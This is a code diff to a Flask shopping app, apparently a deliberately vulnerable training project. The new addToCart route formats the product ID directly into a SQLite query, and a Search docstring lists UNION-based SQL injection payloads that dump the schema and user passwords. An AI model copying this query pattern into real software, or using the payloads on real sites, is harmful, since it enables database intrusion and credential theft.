@@ -14,7 +14,30 @@ def ShoppingCart():
     else:
         user = None
 
-    return render_template("shopping/ShoppingCart.html", user=user)
+    if 'cart' in session:
+        cart = session['cart']
+    else:
+        cart = []
+
+    return render_template("shopping/ShoppingCart.html", user=user, cart=cart)
+
+@shopping_blueprint.route("/Add/<productID>")
+def addToCart(productID):
+    if 'cart' in session:
+        cart = session['cart']
+    else:
+        cart = []
+    
+    conn = sqlite3.connect(os.path.join(file_directory, "storage.db"))
+    c = conn.cursor()
+    c.execute(" SELECT * FROM products WHERE rowid='{}' ".format(productID))
+    item = c.fetchone()
+    conn.close()
+    
+    cart.append(item)
+    session['cart'] = cart
+    
+    return redirect(url_for('shopping.ShoppingCart'))
 
 
 @shopping_blueprint.route("/Products", methods=['POST', 'GET'])
@@ -58,11 +81,11 @@ def Search(product):
     EXFILTRATE DB SCHEMA
     ' UNION SELECT * FROM x-- (Error: No such table x)
     ' UNION SELECT '1' FROM sqlite_master-- (Error: SELECTs to the left and right of UNION do not have the same number of result columns)
-    ' UNION SELECT '1', '2', '3', '4', '5', '6' FROM sqlite_master-- (Returns all products)
-    ' UNION SELECT '1', sql, '3', '4', '5', '6' FROM sqlite_master-- (Returns all tables in schema)
+    ' UNION SELECT '1', '2', '3', '4', '5', '6', '7' FROM sqlite_master-- (Returns all products)
+    ' UNION SELECT '1', sql, '3', '4', '5', '6', '7' FROM sqlite_master-- (Returns all tables in schema)
 
     GET ALL USER CREDENTIALS (After knowing fields in user table)
-    ' UNION SELECT '1', username, '3', '4', password,'6' FROM users--
+    ' UNION SELECT '1', username, '3', '4', password, '6', '7' FROM users--
     """
 
     # Search Form
